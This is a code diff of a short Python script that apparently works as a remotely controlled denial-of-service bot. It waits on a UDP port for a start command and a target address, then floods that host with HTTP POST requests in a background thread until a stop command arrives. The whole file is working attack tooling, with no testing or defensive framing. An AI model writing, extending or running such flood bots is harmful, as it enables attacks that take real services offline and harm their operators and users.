@@ -1,36 +1,63 @@
 from socket import *
 import requests
+from threading import Thread
+
+global Kill
+Kill = False
 
 def Post(url,attackedServerPort):
     parameters = {'dumb': 'dumb'}
     r = requests.post(url,data = parameters)
-    print (r.text)
+    print r.text
 
 def Is_attack(msg):
+    global Kill
+
     if (msg == 'S'):
-        return True
+        Kill = False
     elif (msg == 'B'):
-        return False
+        Kill = True
 
-attackedServerPort = 9000
-serverPort = 12000
-serverSocket = socket(AF_INET,SOCK_DGRAM)
-hostName = gethostbyname('0.0.0.0')
-serverSocket.bind((hostName,serverPort))
-entence, addr = serverSocket.recvfrom(1024)
-sentence = "S/192.168.43.212:8000"
+def attack(IP, attackedServerPort):
 
-command = sentence.split('/')[0]
-IP = sentence.split('/')[1]
+    while not Kill:
+        Post(IP, attackedServerPort)
 
-IP = 'http://' + IP
-print IP
-if Is_attack(command):
+
+
+def listening():
+    sentence = ''
+    attackedServerPort = 8000
+    serverPort = 12000
+    serverSocket = socket(AF_INET, SOCK_DGRAM)
+    hostName = gethostbyname('0.0.0.0')
+    serverSocket.bind((hostName, serverPort))
+
+    while not sentence:
+        sentence, addr = serverSocket.recvfrom(1024)
+
+
+    command = sentence.split('/')[0]
+    IP = sentence.split('/')[1]
+
+    IP = 'http://' + IP + ':' + str(attackedServerPort)
+
+    attackThread = Thread(target=attack, args=[IP, attackedServerPort])
+    attackThread.start()
 
     while 1:
-        Post(IP,attackedServerPort)
+        sentence, addr = serverSocket.recvfrom(1024)
+        command = sentence.split('/')[0]
+        Is_attack(command)
 
-serverSocket.close()
+
+    serverSocket.close()
+
+
+if __name__ == "__main__":
+
+    listeningThread = Thread(target= listening)
+    listeningThread.start()
 
 
 
